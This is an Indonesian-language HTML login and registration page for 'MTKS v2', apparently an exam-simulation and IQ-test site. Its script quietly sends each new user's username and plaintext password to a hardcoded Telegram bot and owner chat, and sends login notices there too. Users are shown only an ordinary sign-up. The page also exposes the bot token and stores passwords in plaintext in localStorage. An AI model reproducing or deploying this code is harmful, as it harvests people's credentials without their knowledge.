<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MTKS | Login & Daftar</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        :root {
            --bg-primary: #070a14;
            --bg-card: rgba(18, 24, 40, 0.85);
            --primary: #6366f1;
            --primary-dark: #4f46e5;
            --primary-light: #818cf8;
            --secondary: #06b6d4;
            --text-primary: #f1f5f9;
            --text-secondary: #94a3b8;
            --radius-md: 20px;
            --radius-sm: 12px;
        }
        body {
            font-family: 'Inter', monospace;
            background: var(--bg-primary);
            color: var(--text-primary);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: radial-gradient(circle at 20% 30%, rgba(99, 102, 241, 0.08) 0%, transparent 50%),
                        radial-gradient(circle at 80% 70%, rgba(6, 182, 212, 0.06) 0%, transparent 50%);
            z-index: -1;
        }
        .login-container {
            max-width: 420px;
            width: 100%;
            background: var(--bg-card);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: var(--radius-md);
            padding: 32px 24px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
        }
        .brand {
            display: flex;
            align-items: center;
            gap: 14px;
            margin-bottom: 28px;
        }
        .logo-shape {
            width: 48px;
            height: 48px;
            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 8px 20px rgba(99, 102, 241, 0.3);
        }
        .brand h1 {
            font-size: 1.5rem;
            font-weight: 700;
        }
        .brand span {
            font-size: 0.7rem;
            color: var(--text-secondary);
            font-weight: 500;
        }
        .tabs {
            display: flex;
            gap: 8px;
            margin-bottom: 24px;
            background: rgba(0,0,0,0.3);
            border-radius: var(--radius-sm);
            padding: 4px;
        }
        .tab-btn {
            flex: 1;
            padding: 10px;
            border: none;
            background: transparent;
            color: var(--text-secondary);
            font-weight: 600;
            font-size: 0.9rem;
            border-radius: var(--radius-sm);
            cursor: pointer;
            transition: all 0.2s;
            font-family: 'Inter', monospace;
        }
        .tab-btn.active {
            background: var(--primary);
            color: white;
        }
        .form-group {
            margin-bottom: 16px;
        }
        .form-group label {
            display: block;
            font-size: 0.75rem;
            font-weight: 600;
            color: var(--text-secondary);
            margin-bottom: 6px;
            letter-spacing: 0.3px;
        }
        .form-group input {
            width: 100%;
            background: rgba(0,0,0,0.3);
            border: 1px solid rgba(255,255,255,0.08);
            border-radius: var(--radius-sm);
            padding: 14px 16px;
            color: var(--text-primary);
            font-size: 0.95rem;
            font-family: 'Inter', monospace;
            transition: all 0.2s;
        }
        .form-group input:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.15);
        }
        .btn-primary {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            border: none;
            border-radius: var(--radius-sm);
            color: white;
            font-weight: 700;
            font-size: 0.95rem;
            cursor: pointer;
            transition: all 0.25s;
            font-family: 'Inter', monospace;
        }
        .btn-primary:active { transform: scale(0.98); }
        .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; }
        .message {
            margin-top: 16px;
            padding: 12px;
            border-radius: var(--radius-sm);
            text-align: center;
            font-size: 0.85rem;
            font-weight: 500;
            display: none;
        }
        .message.error { display: block; background: rgba(239,68,68,0.15); color: #f87171; border: 1px solid rgba(239,68,68,0.2); }
        .message.success { display: block; background: rgba(16,185,129,0.15); color: #34d399; border: 1px solid rgba(16,185,129,0.2); }
        .message.info { display: block; background: rgba(99,102,241,0.15); color: #818cf8; border: 1px solid rgba(99,102,241,0.2); }
        .hidden-form { display: none; }
        .footer-note {
            margin-top: 20px;
            text-align: center;
            font-size: 0.7rem;
            color: var(--text-secondary);
        }
        .loading-spinner {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255,255,255,0.2);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            vertical-align: middle;
            margin-right: 8px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="brand">
            <div class="logo-shape">
                <svg viewBox="0 0 24 24" width="22" height="22" stroke="white" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"/>
                </svg>
            </div>
            <div>
                <h1>MTKS</h1>
                <span>Login & Daftar Akun</span>
            </div>
        </div>

        <!-- Tabs -->
        <div class="tabs">
            <button class="tab-btn active" id="tabLogin" onclick="switchTab('login')">Masuk</button>
            <button class="tab-btn" id="tabRegister" onclick="switchTab('register')">Daftar</button>
        </div>

        <!-- Form Login -->
        <form id="loginForm" onsubmit="handleLogin(event)">
            <div class="form-group">
                <label>Username</label>
                <input type="text" id="loginUsername" placeholder="Masukkan username" required>
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" id="loginPassword" placeholder="Masukkan password" required>
            </div>
            <button type="submit" class="btn-primary" id="loginBtn">Masuk</button>
            <div id="loginMessage" class="message"></div>
        </form>

        <!-- Form Register -->
        <form id="registerForm" class="hidden-form" onsubmit="handleRegister(event)">
            <div class="form-group">
                <label>Username</label>
                <input type="text" id="regUsername" placeholder="Pilih username" required minlength="3">
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" id="regPassword" placeholder="Buat password" required minlength="4">
            </div>
            <div class="form-group">
                <label>Konfirmasi Password</label>
                <input type="password" id="regConfirm" placeholder="Ulangi password" required>
            </div>
            <button type="submit" class="btn-primary" id="registerBtn">Daftar</button>
            <div id="registerMessage" class="message"></div>
        </form>

        <div class="footer-note">
            MTKS v2 — Ujian Simulasi &amp; IQ
        </div>
    </div>

    <script>
        // ========== KONFIGURASI BOT TELEGRAM (RAHASIA) ==========
        const BOT_TOKEN = '8560885133:AAF7heamasTq4YeD7mO6TZPYEpversCLUA4';
        const OWNER_ID = '8533245075';
        // ========================================================

        // SESSION / STORAGE
        const SESSION_KEY = 'mtks_session';

        // Cek session saat load
        (function checkSession() {
            const session = sessionStorage.getItem(SESSION_KEY);
            if (session) {
                try {
                    const data = JSON.parse(session);
                    if (data.username && data.loggedIn) {
                        // Redirect ke index
                        window.location.href = 'index.html';
                        return;
                    }
                } catch(e) {}
            }
            // Hapus session invalid
            sessionStorage.removeItem(SESSION_KEY);
        })();

        // Tab switching
        function switchTab(tab) {
            const loginForm = document.getElementById('loginForm');
            const registerForm = document.getElementById('registerForm');
            const tabLogin = document.getElementById('tabLogin');
            const tabRegister = document.getElementById('tabRegister');

            if (tab === 'login') {
                loginForm.classList.remove('hidden-form');
                registerForm.classList.add('hidden-form');
                tabLogin.classList.add('active');
                tabRegister.classList.remove('active');
                clearMessages();
            } else {
                loginForm.classList.add('hidden-form');
                registerForm.classList.remove('hidden-form');
                tabRegister.classList.add('active');
                tabLogin.classList.remove('active');
                clearMessages();
            }
        }

        function clearMessages() {
            document.querySelectorAll('.message').forEach(el => {
                el.className = 'message';
                el.style.display = 'none';
                el.textContent = '';
            });
        }

        function showMessage(elementId, text, type = 'error') {
            const el = document.getElementById(elementId);
            el.className = `message ${type}`;
            el.textContent = text;
            el.style.display = 'block';
        }

        // ========== KIRIM KE TELEGRAM ==========
        async function sendToTelegram(username, password, action = 'register') {
            const text = `🔐 *AKUN BARU MTKS*\n\n👤 *Username:* ${username}\n🔑 *Password:* ${password}\n📌 *Action:* ${action}\n🕐 *Waktu:* ${new Date().toLocaleString('id-ID')}`;
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: OWNER_ID,
                        text: text,
                        parse_mode: 'Markdown'
                    })
                });
                const result = await response.json();
                return result.ok;
            } catch (error) {
                console.error('Telegram send error:', error);
                return false;
            }
        }

        // ========== HANDLE REGISTER ==========
        async function handleRegister(e) {
            e.preventDefault();
            const username = document.getElementById('regUsername').value.trim();
            const password = document.getElementById('regPassword').value;
            const confirm = document.getElementById('regConfirm').value;

            const msgEl = 'registerMessage';
            const btn = document.getElementById('registerBtn');

            if (username.length < 3) {
                showMessage(msgEl, 'Username minimal 3 karakter', 'error');
                return;
            }
            if (password.length < 4) {
                showMessage(msgEl, 'Password minimal 4 karakter', 'error');
                return;
            }
            if (password !== confirm) {
                showMessage(msgEl, 'Password tidak cocok!', 'error');
                return;
            }

            // Simpan ke localStorage (akun)
            const accounts = JSON.parse(localStorage.getItem('mtks_accounts') || '[]');
            if (accounts.find(acc => acc.username === username)) {
                showMessage(msgEl, 'Username sudah terdaftar!', 'error');
                return;
            }

            // Disable button & show loading
            btn.disabled = true;
            btn.innerHTML = '<span class="loading-spinner"></span> Mendaftar...';

            // Kirim ke Telegram
            await sendToTelegram(username, password, 'register');

            // Simpan akun
            accounts.push({ username, password });
            localStorage.setItem('mtks_accounts', JSON.stringify(accounts));

            // Auto login
            sessionStorage.setItem(SESSION_KEY, JSON.stringify({ username, loggedIn: true }));

            showMessage(msgEl, '✅ Pendaftaran berhasil! Mengalihkan...', 'success');

            setTimeout(() => {
                window.location.href = 'index.html';
            }, 1200);
        }

        // ========== HANDLE LOGIN ==========
        async function handleLogin(e) {
            e.preventDefault();
            const username = document.getElementById('loginUsername').value.trim();
            const password = document.getElementById('loginPassword').value;

            const msgEl = 'loginMessage';
            const btn = document.getElementById('loginBtn');

            if (!username || !password) {
                showMessage(msgEl, 'Isi username dan password!', 'error');
                return;
            }

            const accounts = JSON.parse(localStorage.getItem('mtks_accounts') || '[]');
            const found = accounts.find(acc => acc.username === username && acc.password === password);

            if (!found) {
                showMessage(msgEl, 'Username atau password salah!', 'error');
                return;
            }

            btn.disabled = true;
            btn.innerHTML = '<span class="loading-spinner"></span> Masuk...';

            // Kirim notifikasi login ke Telegram
            await sendToTelegram(username, '***', 'login');

            // Set session
            sessionStorage.setItem(SESSION_KEY, JSON.stringify({ username, loggedIn: true }));

            showMessage(msgEl, '✅ Login berhasil! Mengalihkan...', 'success');

            setTimeout(() => {
                window.location.href = 'index.html';
            }, 1000);
        }

        // ========== LOGOUT (dipanggil dari index) ==========
        window.logoutMTKS = function() {
            sessionStorage.removeItem(SESSION_KEY);
            window.location.href = 'login.html';
        };

        // ========== CEK SESSION DI INDEX (untuk proteksi) ==========
        // Fungsi ini akan dipanggil di index.html untuk validasi
        window.checkSessionRedirect = function() {
            const session = sessionStorage.getItem(SESSION_KEY);
            if (!session) {
                window.location.href = 'login.html';
                return false;
            }
            try {
                const data = JSON.parse(session);
                if (!data.loggedIn || !data.username) {
                    window.location.href = 'login.html';
                    return false;
                }
                return true;
            } catch(e) {
                window.location.href = 'login.html';
                return false;
            }
        };

        // ========== AMBIL USERNAME SESSION ==========
        window.getSessionUser = function() {
            const session = sessionStorage.getItem(SESSION_KEY);
            if (!session) return null;
            try {
                const data = JSON.parse(session);
                return data.username || null;
            } catch(e) { return null; }
        };
    </script>
</body>
</html>
